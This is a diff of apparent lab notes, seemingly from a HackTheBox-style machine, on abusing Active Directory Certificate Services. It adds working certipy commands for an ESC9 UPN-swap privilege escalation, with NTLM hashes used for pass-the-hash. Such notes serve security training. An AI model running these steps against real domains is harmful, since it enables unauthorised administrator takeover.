@@ -4,4 +4,21 @@ After obtaining valid domain creds, it is always a good idea to check (adcs) act
 
   ## the above command will list vulnerable CA templates
 
-2. then run this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User
+2. this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User
+
+3. this command turns the .pfx into a hash for possible winrm == certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+
+IF YOU FIND A TEMPLETE VULNERABLE TO ESC9 FOLLOW THESE STEPS.
+
+The attack from here is to change the userPrincipalName (or UPN) of the second account to Administrator. This is explicitly not Administrator@domain, as that would conflict with the legit administrator account.
+
+When I request a certificate as the second account, the server will return one with the UPN Administrator and no SID.
+
+When I use this certificate, Windows is nice enough to assume that domain is it’s domain, and authenticate as administrator.
+
+1. change the pwnded accounts upn to Administrator == certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 
+
+2. request a cert with your pwned account using the vuln template == certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
+
+3. set your account back to what it was == certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
+
